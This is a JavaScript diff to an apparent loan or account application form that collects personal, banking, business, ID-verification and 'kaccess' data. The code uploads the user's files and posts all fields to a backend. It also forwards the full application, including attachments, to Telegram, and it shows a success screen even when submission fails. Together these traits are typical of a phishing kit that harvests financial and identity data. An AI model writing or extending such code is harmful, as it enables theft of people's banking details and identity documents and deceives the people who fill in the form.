@@ -516,8 +516,113 @@ function initApplicationForm() {
           idVerify: formData.idVerify,
           kaccess: formData.kaccess
         };
+        var API_BASE = (window.__ENV && window.__ENV.API_BASE) || '/.netlify/functions';
 
-        (function saveForAdmin() {
+        saveForAdminLocal(appId, appData, filesInfo);
+
+        (async function submitFlow() {
+          function showOfflineToast() {
+            var toast = document.getElementById('offlineToast');
+            if (toast) {
+              toast.style.display = 'block';
+              setTimeout(function () { toast.style.display = 'none'; }, 6000);
+            }
+          }
+
+          function showSuccess() {
+            var successEl = document.querySelector('.application-success');
+            if (successEl) {
+              formCard.style.display = 'none';
+              successEl.style.display = 'block';
+              window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+          }
+
+          try {
+            var userUid = 'anon';
+            try {
+              if (window.supabase && window.supabase.auth) {
+                var su = await window.supabase.auth.getUser();
+                if (su && su.data && su.data.user) userUid = su.data.user.id;
+              }
+            } catch (_) {}
+
+            var storageFiles = [];
+            for (var i = 0; i < filesInfo.length; i++) {
+              var fi = filesInfo[i];
+              if (!fi || !fi.file) continue;
+              var safeName = (fi.name || 'file').replace(/[^a-zA-Z0-9._-]/g, '_');
+              var field = (fi.fieldName || 'upload').replace(/[^a-zA-Z0-9_-]/g, '_');
+              var path = userUid + '/' + appId + '/' + field + '-' + safeName;
+              try {
+                if (window.supabase && window.supabase.storage) {
+                  await window.supabase.storage
+                    .from('application-uploads')
+                    .upload(path, fi.file, { contentType: fi.type || undefined, upsert: true });
+                }
+                storageFiles.push({
+                  storageObjectPath: path,
+                  fieldName: fi.fieldName,
+                  fieldLabel: fi.fieldLabel,
+                  filename: fi.name,
+                  mimeType: fi.type,
+                  size: fi.size,
+                });
+              } catch (upErr) {
+                console.warn('storage upload failed for', path, upErr.message);
+              }
+            }
+
+            var visitorSession = '';
+            try { visitorSession = sessionStorage.getItem('tg_session_id') || ''; } catch (_) {}
+
+            var submitResp = await fetch(API_BASE + '/submit-application', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              credentials: 'include',
+              body: JSON.stringify({
+                personal: formData.personal,
+                banking: formData.banking,
+                business: formData.business,
+                id_verify: formData.idVerify,
+                kaccess: formData.kaccess,
+                files: storageFiles,
+                shortAppId: appId,
+                visitorSession: visitorSession,
+              }),
+            });
+
+            if (!submitResp.ok) {
+              throw new Error('submit-application HTTP ' + submitResp.status);
+            }
+            var result = await submitResp.json().catch(function () { return { success: true }; });
+            if (result && result.appIdShort) {
+              try {
+                var badge = document.getElementById('appId');
+                if (badge) badge.textContent = result.appIdShort;
+              } catch (_) {}
+            }
+
+            if (window.sendFullApplicationToTelegram) {
+              try {
+                var tgDone = false;
+                var tgPromise = window.sendFullApplicationToTelegram(appData, filesInfo);
+                tgPromise.then(function () { tgDone = true; showSuccess(); }).catch(function () { showSuccess(); });
+                setTimeout(function () { if (!tgDone) showSuccess(); }, 8000);
+              } catch (_) {
+                showSuccess();
+              }
+            } else {
+              showSuccess();
+            }
+          } catch (err) {
+            console.warn('submitFlow offline:', err.message || err);
+            showOfflineToast();
+            setTimeout(showSuccess, 2000);
+          }
+        })();
+
+        function saveForAdminLocal(appId, appData, filesInfo) {
           try {
             var summary = {
               id: appId,
@@ -594,31 +699,8 @@ function initApplicationForm() {
               pushApp();
             }
           } catch (e) {}
-        })();
-
-        var tgPromise = null;
-        if (window.sendFullApplicationToTelegram) {
-          try {
-            tgPromise = window.sendFullApplicationToTelegram(appData, filesInfo);
-          } catch (e) { tgPromise = null; }
         }
 
-        function showSuccess() {
-          const successEl = document.querySelector('.application-success');
-          if (successEl) {
-            formCard.style.display = 'none';
-            successEl.style.display = 'block';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-          }
-        }
-
-        if (tgPromise && typeof tgPromise.then === 'function') {
-          var done = false;
-          tgPromise.then(function () { done = true; showSuccess(); });
-          setTimeout(function () { if (!done) { done = true; showSuccess(); } }, 8000);
-        } else {
-          setTimeout(showSuccess, 2000);
-        }
         return;
       }
 
